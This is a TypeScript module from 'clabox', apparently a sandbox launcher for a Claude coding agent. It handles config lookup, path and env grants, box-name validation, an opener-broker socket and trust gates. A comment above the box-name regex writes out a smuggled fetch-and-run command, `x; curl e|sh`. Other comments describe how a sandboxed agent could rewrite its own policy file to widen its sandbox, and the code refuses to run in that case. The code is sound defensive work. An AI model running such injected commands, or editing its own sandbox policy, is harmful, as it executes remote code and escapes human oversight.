  for (const key of ['read', 'write', 'stat', 'exec', 'socket', 'deny'] as const) {
    out[key] = [...new Set(out[key])];
  }
  // Fold every class back into one table, narrowest first so the letters read in
  // a stable order. A path in two classes ends up with both letters.
  const table: GrantTable = {};
  const addLetter = (p: string, letter: string) => {
    const cur = table[p] ?? '';
    if (!cur.includes(letter)) table[p] = cur + letter;
  };
  for (const [letter, list] of [
    ['s', out.stat],
    ['r', out.read],
    ['w', out.write],
    ['e', out.exec],
    ['c', out.socket],
  ] as Array<[string, string[]]>) {
    for (const p of list) addLetter(p, letter);
  }
  for (const [p, letters] of extraLetters) for (const l of letters) addLetter(p, l);
  out.table = table;
  return out;
}

/**
 * Append extra path grants (e.g. from the `--ro`/`--rw`/`--stat` CLI flags) onto
 * a config's `paths`. Unlike a config-file merge — where arrays *replace* —
 * these are **additive**: they concatenate onto `config.paths.readOnly` /
 * `readWrite` / `stat`, so an ad-hoc CLI grant never wipes out a box's own
 * paths. Returns the same config unchanged when nothing extra is supplied.
 */
export function withExtraPaths(
  config: Config,
  extra: { readOnly?: string[]; readWrite?: string[]; stat?: string[]; socket?: string[] } = {},
): Config {
  const readOnly = extra.readOnly ?? [];
  const readWrite = extra.readWrite ?? [];
  const stat = extra.stat ?? [];
  const socket = extra.socket ?? [];
  if (!readOnly.length && !readWrite.length && !stat.length && !socket.length) return config;
  return {
    ...config,
    paths: {
      ...config.paths,
      readOnly: [...(config.paths.readOnly ?? []), ...readOnly],
      readWrite: [...(config.paths.readWrite ?? []), ...readWrite],
      stat: [...(config.paths.stat ?? []), ...stat],
      socket: [...(config.paths.socket ?? []), ...socket],
    },
  };
}

/**
 * Layer ad-hoc env overrides (from the repeatable `--env`/`-e` CLI flag) onto
 * `config.env`. Each entry is either `KEY=VALUE` (set it) or a bare `KEY`
 * (**unset** it — emitted as `env -u KEY`, the only way to drop a var a shared
 * preset or the shell exported). Later entries win, and they win over the
 * config's own `env`, so one tab can differ from its box without a new config:
 *
 *     clabox -b ax-mg -e DISABLE_TELEMETRY      # this tab gets /rc
 *     clabox -b ax-mg -e DISABLE_TELEMETRY=1    # this tab stays private
 *
 * Pure; returns the same config when nothing is passed. Entries without a name
 * (e.g. `=1`) are ignored rather than producing a broken `env` argument.
 */
export function withExtraEnv(config: Config, entries: string[] = []): Config {
  if (!entries.length) return config;
  const env: Record<string, string | null> = { ...(config.env ?? {}) };
  for (const entry of entries) {
    const eq = entry.indexOf('=');
    const key = (eq === -1 ? entry : entry.slice(0, eq)).trim();
    if (!key) continue;
    env[key] = eq === -1 ? null : entry.slice(eq + 1);
  }
  return { ...config, env };
}

/**
 * Locate a config file: explicit (CLI arg, then `CLABOX_CONFIG` env),
 * then CWD, then ~/.config. The CLI arg wins over the env var.
 *
 * The CWD candidate is why {@link loadConfig} runs a trust check: in a repo a
 * box has been working in, `./clabox.config.mjs` is an agent-writable file that
 * a bare `clabox` would otherwise execute, unsandboxed, on the next launch.
 */
export function findConfigFile(explicit?: string | null): string | null {
  const chosen = explicit ?? env.CLABOX_CONFIG;
  if (chosen) return expandHome(chosen);
  const candidates = [
    path.join(process.cwd(), 'clabox.config.mjs'),
    path.join(process.cwd(), 'clabox.config.js'),
    path.join(HOME, '.config', 'clabox', 'config.mjs'),
  ];
  return candidates.find((c) => fs.existsSync(c)) ?? null;
}

/**
 * Global directory holding named "box" configs (`<name>.config.mjs`), used by
 * the `clabox --box <name>` / `-b` flag. Override with `CLABOX_CONFIGS_DIR`.
 */
export function configsDir(): string {
  return expandHome(env.CLABOX_CONFIGS_DIR ?? '~/.config/clabox/configs');
}

/**
 * Clabox's own home dir — the parent of {@link configsDir} (default
 * `~/.config/clabox`, honoring `CLABOX_CONFIGS_DIR`). Holds clabox-owned
 * generated artifacts (`scripts/`, `ghostty/`, `apps/`) and the per-box extras
 * compiled by `buildBoxExtras` (`mcp/`, `settings/`). Deliberately kept OUT of
 * Claude's `configDir` so clabox never pollutes Claude's own profile dir.
 */
export function claboxHomeDir(): string {
  return path.dirname(configsDir());
}

/** `<claboxHome>/mcp` — per-box compiled `--mcp-config` json lives here. */
export function claboxMcpDir(): string {
  return path.join(claboxHomeDir(), 'mcp');
}

/** `<claboxHome>/settings` — per-box compiled `--settings` (hooks) json lives here. */
export function claboxSettingsDir(): string {
  return path.join(claboxHomeDir(), 'settings');
}

/**
 * `<claboxHome>/opener` — everything the opener broker owns, in one directory:
 * its socket, its pid file and its log. One dir rather than a socket under
 * `run/` and a log at the clabox-home root, so "what does the broker have on
 * disk" is answered by `ls`.
 *
 * Under the clabox home rather than `$TMPDIR` on purpose: `$TMPDIR` is granted
 * read-write to *every* box, so a socket there could be driven by any box (and
 * by any other process of yours), whereas the clabox home is read-only in-box
 * and reaching the socket at all takes an explicit per-box grant. Connecting
 * needs no write access — a unix-socket `connect(2)` is `network-outbound` with
 * a path filter, not a file write. The log is written by the broker, which runs
 * *outside* every box, so read-only in-box costs it nothing either.
 */
export function openerDir(): string {
  return path.join(claboxHomeDir(), 'opener');
}

/** The socket the opener broker listens on: `<claboxHome>/opener/opener-<uid>.sock`. */
export function openerSocketPath(): string {
  // ONE socket for the machine, not one per box. The broker is a convenience
  // the user runs for themselves, and every box talks to the same one — a box
  // only ever sends a path, and the answer (a Finder window, an editor tab)
  // goes to the user, never back to the box.
  return path.join(openerDir(), `opener-${process.getuid?.() ?? 0}.sock`);
}

/**
 * `<claboxHome>/opener/opener-<uid>.pid` — the broker's pid file, next to its
 * socket. The broker is a singleton (one socket per uid), so a second
 * `clabox opener` has to *find* the first rather than quietly unlink its socket
 * and leave it running with nothing to serve.
 */
export function openerPidPath(): string {
  return openerSocketPath().replace(/\.sock$/, '.pid');
}

/**
 * `<claboxHome>/opener/opener.log` — one line per request, allowed or not.
 *
 * Derived from {@link openerDir}, not from the socket path: it used to be
 * `dirname(dirname(socket))`, which silently followed the socket up two levels
 * and would land somewhere else the moment the layout changed.
 */
export function openerLogPath(): string {
  return path.join(openerDir(), 'opener.log');
}

/**
 * `<claboxHome>/opener/claude-aliases.sh` — the source-able shell helpers
 * (`o`, `c`, `ob`) the broker generates for itself, beside its socket and log.
 *
 * In the clabox home rather than somewhere in the user's dotfiles because a box
 * has to be able to **read** it: the helpers are what the agent types inside the
 * box, and the post-deny carve-out already grants that tree read-only.
 */
export function openerAliasesPath(): string {
  return path.join(openerDir(), ALIASES_FILENAME);
}

/**
 * The opener policy: which directories may be shown and with what editor.
 *
 * Deliberately NOT per box. A box only ever sends a path; the result (a Finder
 * window, an editor tab) lands in front of the **user**, never back in the box.
 * So there is one broker for the machine, its policy comes from wherever it was
 * started (the global config, or `--root`/`--editor` flags), and every box
 * talks to the same socket.
 *
 * A box can still opt out with `opener: { enabled: false }` — then the profile
 * grants it no socket at all. Default: enabled, roots `[$HOME]`, no editor
 * (which means `open -t`, the system text editor).
 */
export function resolvedOpener(config: Config): {
  roots: string[];
  editor: string | null;
  extensions?: string[];
  maxPerMinute?: number;
} | null {
  const o = config.opener;
  if (o?.enabled === false) return null;
  const roots = (o?.roots?.length ? o.roots : [HOME]).map((r) => path.resolve(expandHome(r)));
  return {
    roots,
    editor: o?.editor ?? null,
    extensions: o?.extensions,
    maxPerMinute: o?.maxPerMinute,
  };
}

/**
 * `<claboxHome>/bin` — de-privileged copies of system tools the sandbox can't
 * exec in their original form (see `sandbox/proctools.ts`). Prepended to the
 * box's PATH. Lives under the clabox home because that dir already carries the
 * post-deny read + `process-exec` carve-out, so nothing new opens in the
 * profile.
 */
export function claboxBinDir(): string {
  return path.join(claboxHomeDir(), 'bin');
}

const BOX_SUFFIXES = ['.config.mjs', '.mjs'];

/**
 * What a box name may contain. Box names are **filenames that become code**:
 * `init` interpolates them into a generated `clabox-<name>()` shell function and
 * into the `zsh -lic '… -b <name>'` command baked into a Ghostty app, and `tab`
 * puts them in an AppleScript surface command. A name is attacker-chosen as soon
 * as box configs come from a repo (see utils/trust.ts), so `x; curl e|sh; #.mjs`
 * must never reach a generator. Letters, digits, `.`/`_`/`-`, first char
 * alphanumeric — anything else is not a box.
 */
const BOX_NAME_RE = /^[A-Za-z0-9][A-Za-z0-9._-]*$/;

/** True when `name` is safe to interpolate into a generated command. */
export function isSafeBoxName(name: string): boolean {
  return BOX_NAME_RE.test(name);
}

/** {@link isSafeBoxName} as a guard; returns the name so it can be chained. */
export function assertSafeBoxName(name: string): string {
  if (!isSafeBoxName(name)) {
    throw new Error(
      `clabox: unsafe box name '${name}' — only letters, digits, '.', '_' and '-' are allowed (a box name ends up inside generated shell commands)`,
    );
  }
  return name;
}

/** Candidate file paths for a box name, in resolution order. */
function boxCandidates(name: string, dir: string): string[] {
  return BOX_SUFFIXES.map((s) => path.join(dir, `${name}${s}`));
}

/** True if `p` exists and is a regular file (not a directory). */
function isFile(p: string): boolean {
  try {
    return fs.statSync(p).isFile();
  } catch {
    return false;
  }
}

/** Named box configs (sorted, de-duplicated) available in {@link configsDir}. */
export function listBoxes(dir: string = configsDir()): string[] {
  let entries: string[];
  try {
    entries = fs.readdirSync(dir);
  } catch {
    return [];
  }
  const names = new Set<string>();
  for (const f of entries) {
    // `_`-prefixed files are shared partials (e.g. `_presets.mjs`), not boxes.
    if (f.startsWith('_')) continue;
    const suffix = BOX_SUFFIXES.find((s) => f.endsWith(s));
    if (!suffix) continue;
    const name = f.slice(0, -suffix.length);
    // A filename that isn't a usable box name is skipped rather than listed:
    // `-b` would refuse it anyway, and `init` would otherwise interpolate it
    // into a shell function and a Ghostty `command` (see BOX_NAME_RE).
    if (isSafeBoxName(name)) names.add(name);
  }
  return [...names].sort();
}

/**
 * Resolve a `-b`/`--box` ref to its config file. Three forms:
 *
 *  - `<name>` — a named box in {@link configsDir} (or `dir`), preferring
 *    `<name>.config.mjs` over a bare `<name>.mjs`;
 *  - `path/to/<name>` — the same name lookup, but inside that directory
 *    (`~`-expanded, relative to the CWD), so a repo can carry its own boxes;
 *  - `path/to/file.mjs` — an explicit config file, used as-is.
 *
 * @throws if no matching file exists (the message lists the available boxes).
 */
export function resolveBox(ref: string, dir: string = configsDir()): string {
  const expanded = expandHome(ref);
  // Explicit file path: `-b path/vibe.mjs` (covers `.config.mjs` too).
  if (expanded.endsWith('.mjs')) {
    const file = path.resolve(expanded);
    if (isFile(file)) return file;
    throw new Error(`clabox: box config '${ref}' not found (${file})`);
  }
  // Directory-qualified name: `-b path/to/vibe` = box `vibe` inside `path/to`
  // — same suffix preference and `_`-partial refusal as a named box.
  if (expanded.includes(path.sep)) {
    const p = path.resolve(expanded);
    return resolveBox(path.basename(p), path.dirname(p));
  }
  // `_`-prefixed files are shared partials (e.g. `_presets.mjs`), not boxes —
  // keep them un-resolvable so `-b` matches what `listBoxes` advertises.
  // The charset check is the same one `listBoxes` filters on: a name that would
  // be unsafe to interpolate into a generated command is not a box.
  if (!ref.startsWith('_')) {
    assertSafeBoxName(ref);
    const found = boxCandidates(ref, dir).find((c) => isFile(c));
    if (found) return found;
  }
  const available = listBoxes(dir);
  const hint = available.length ? `available: ${available.join(', ')}` : `none found in ${dir}`;
  throw new Error(`clabox: box '${ref}' not found in ${dir} (${hint})`);
}

/** Result of {@link loadConfig}: the effective config and the file it came from. */
export interface LoadedConfig {
  config: Config;
  configFile: string | null;
  /** How the config file passed the trust gate (null → built-in defaults). */
  trust: TrustState | 'accepted' | null;
}

/**
 * Effective project dir for a config: `config.cwd` (`~`-expanded, absolute) or
 * the shell's CWD. `sandbox/run.ts#resolveProjectDir` is the public name for
 * this; it lives here too so the config layer can reason about the project dir
 * (which paths a box can write) without importing the launcher.
 */
export function projectDirOf(config: Config): string {
  return config.cwd ? path.resolve(expandHome(config.cwd)) : process.cwd();
}

/**
 * True when `p` is buried by the **hard secret deny** — the `~/.<denyDotConfigs>`
 * tier the profile emits *after* every allow, so it wins however wide the box's
 * grants are.
 *
 * Load-bearing for the box-writable check: a whole-disk box (`paths: {'/': 'w'}`)
 * lists `/` as writable, and "is the config inside `/`?" is true for every
 * config on the machine — including the ones under `~/.config/clabox`, which
 * that same profile then takes back (read-only carve-out). Without this, such a
 * box refuses to start with "the agent could edit its own policy", which is
 * exactly backwards: that config is the one place it *cannot* write.
 *
 * Judged on the resolved path (`isInside` realpaths both sides), matching
 * Seatbelt — so a clabox home symlinked into a repo is correctly *not* covered,
 * because the file physically sits outside `~/.config` there.
 */
export function hardDeniedPath(config: Config, p: string): boolean {
  return config.denyDotConfigs.some((d) => isInside(path.join(HOME, `.${d}`), p));
}

/**
 * The trees this box can actually **write**, as the generated profile will have
 * them: the project dir, the Claude config dir and every `write` grant —
 * minus the ones a later deny tier buries.
 *
 * Used to answer one question: can the sandboxed agent rewrite the very config
 * that defines its sandbox? SBPL is last-match-wins, and the hard secret deny
 * (`~/.<denyDotConfigs>`, which includes `~/.config`) is emitted after every
 * grant — so a box asking for `'~/.config/clabox': 'w'` does *not* get it, and
 * counting it here would flag the standard layout as unsafe. Regex grants are
 * skipped (no path to compare), with `$TMPDIR` added by hand since that's what
 * the `^/private/var/folders/` rule stands for.
 */
export function boxWritableRoots(config: Config, projectDir = projectDirOf(config)): string[] {
  const rules = resolvedPathRules(config.paths);
  const denied = rules.deny.map(expandHome);
  /** Explicitly denied by this box (`paths.deny` / a `'d'` grant). */
  const boxDenied = (p: string): boolean =>
    denied.some((d) => !d.startsWith('^') && isInside(d, p));
  const hardDenied = (p: string): boolean => hardDeniedPath(config, p);
  // `$TMPDIR` is granted through the `^/private/var/folders/` regex, so it has
  // no plain path for the lists above; name it explicitly, unless the box took
  // one of the three temp-dir base keys away.
  const tmpDenied = TMP_BASE_KEYS.some((k) => (config.paths as Record<string, unknown>)[k] === 'd');
  return [
    projectDir,
    expandHome(config.configDir),
    ...(tmpDenied ? [] : [os.tmpdir()]),
    ...rules.write.map(expandHome),
  ]
    .filter((p) => p.startsWith('/'))
    .filter((p) => !hardDenied(p) && !boxDenied(p));
}

/**
 * Throw when the config file itself sits in a tree the box it configures can
 * write — the self-amplifying case the location-based trust gate can't see.
 *
 * `~/.config/clabox` is trusted by location *and* read-only in-box, which is
 * the whole invariant. But the home may be a symlink into a repo (a documented
 * layout: box configs living in-tree), and Seatbelt matches resolved paths — so
 * the files are then physically inside the project dir, which is granted RW.
 * The agent edits its own box config, and the next launch runs those `paths`.
 * Checked *after* the merge, because it's the resulting config that says what
 * the box may write.
 */
export function assertConfigNotBoxWritable(
  configFile: string,
  config: Config,
  { allow = false }: { allow?: boolean } = {},
): void {
  if (allow) return;
  // The hard secret deny is the profile's last rule, so a config it covers is
  // unwritable in-box no matter what the box asked for — `'/': 'w'` included.
  // Checking the file itself (not just the grant roots) is what keeps a
  // whole-disk box startable with its config in the standard location.
  if (hardDeniedPath(config, configFile)) return;
  const hit = boxWritableRoots(config).find((root) => isInside(root, configFile));
  if (!hit) return;
  throw new Error(
    [
      `clabox: refusing to run — the box config '${configFile}' is inside '${hit}',`,
      'which this box can WRITE: the agent could edit its own policy and the next',
      'launch would honor it. Move it under ~/.config/clabox/configs (read-only',
      'in-box), deny that tree in the box, or pass --trust for this run.',
    ].join('\n'),
  );
}

/**
 * Error names a module loader uses for "this file doesn't parse": `SyntaxError`
 * on Node, `BuildMessage` on Bun (its bundler reports the parse, from its own
 * realm). Used only to word the message — see {@link loadConfig}.
 */
const PARSE_ERROR_NAMES = new Set(['SyntaxError', 'BuildMessage']);

/** Options for {@link loadConfig}. */
export interface LoadConfigOptions {
  /**
   * `--trust` / `CLABOX_TRUST=1`: accept this config file for this run without
   * recording it, and skip the box-writable check. The escape hatch for a
   * one-off, and for CI where nothing is recorded.
   */
  trust?: boolean;
}

/**
 * Build the effective config: defaults ⊕ env ⊕ config file.
 *
 * The file is `import()`ed, i.e. **arbitrary code executed outside the
 * sandbox**, so it passes two gates first: it must be trusted (inside clabox's
 * own home, or recorded by `clabox trust` — see utils/trust.ts), and it must not
 * live in a tree the resulting box could write.
 *
 * @param explicitConfig optional config-file path (e.g. from `--config`);
 *   takes precedence over `CLABOX_CONFIG` and the default lookup locations.
 * @param opts `{ trust }` to bypass both gates for this run.
 */
export async function loadConfig(
  explicitConfig?: string | null,
  { trust = env.CLABOX_TRUST === '1' }: LoadConfigOptions = {},
): Promise<LoadedConfig> {
  let cfg: Config = defaultConfig;
  const file = findConfigFile(explicitConfig);
  if (!file) return { config: cfg, configFile: null, trust: null };

  const state = assertConfigTrusted(file, { claboxHome: claboxHomeDir(), allow: trust });
  // Name the file in any failure. A config is user JavaScript, so the common
  // failures are its own — a syntax error, a bad import, a throw at top level —
  // and the raw error says nothing about *which* file: a bare
  // `Error: Unexpected token '['` out of `clabox` reads as "clabox is broken"
  // when it means "line N of your config is". `cause` keeps the original for
  // anyone who wants the stack.
  let mod: Record<string, unknown>;
  try {
    mod = await import(pathToFileURL(file).href);
  } catch (e) {
    const err = e as Error;
    // Matched by `name`, not `instanceof`: the two runtimes report a parse
    // failure differently — Node raises a real `SyntaxError`, Bun a
    // `BuildMessage` from its own realm (so `instanceof SyntaxError` is false
    // there and the error would be mislabelled "failed to load"). The published
    // package runs on Node; the tests run on Bun. Both have to read right.
    const kind = PARSE_ERROR_NAMES.has(err.name) ? 'has a syntax error' : 'failed to load';
    throw new Error(`clabox: config '${file}' ${kind}: ${err.message}`, { cause: err });
  }
  const exported = mod.default ?? mod.config ?? mod;
  const resolved = typeof exported === 'function' ? await exported(defaultConfig) : exported;
  cfg = mergeConfig(defaultConfig, resolved);
  assertConfigNotBoxWritable(file, cfg, { allow: trust });
  return { config: cfg, configFile: file, trust: trust ? 'accepted' : state };
}
